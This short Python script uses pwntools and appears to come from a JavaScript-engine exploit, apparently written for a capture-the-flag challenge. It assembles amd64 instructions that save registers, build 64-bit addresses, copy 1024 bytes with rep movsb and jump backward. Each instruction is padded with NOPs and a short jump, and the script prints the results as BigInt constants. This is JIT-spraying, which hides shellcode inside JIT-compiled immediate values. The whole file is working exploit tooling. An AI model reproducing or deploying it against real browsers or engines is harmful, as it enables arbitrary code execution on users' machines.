from pwn import *

context.arch = "amd64"

def convert(x):
    jmp = b'\xeb\x0c' # jmp 0xe
    return u64(x.ljust(6, b'\x90') + jmp)

jit_embed = [
    asm('push rdi;push rsi;push rdx;push rcx'),
    asm('mov edi, 0xaabbccdd'),  
    asm('mov edx, 0xaabbccdd'),
    asm('shl rdi, 32'),
    asm('or rdi, rdx'),
    asm('mov esi, 0xaabbccdd'),
    asm('mov edx, 0xaabbccdd'),
    asm('shl rsi, 32'),
    asm('or rsi, rdx; add rsi, r14'),
    asm('mov ecx, 1024'),
    asm('rep movsb;pop rcx; pop rdx; pop rsi; pop rdi'),
    asm('sub rcx,0x59'),
    asm('jmp $-329'),
]

# for i in jit_embed:
#     print(len(i))

imm = [convert(x) for x in jit_embed]
hexstr = ""
for i in imm:
    hexstr += hex(i) + "n,"

print(hexstr)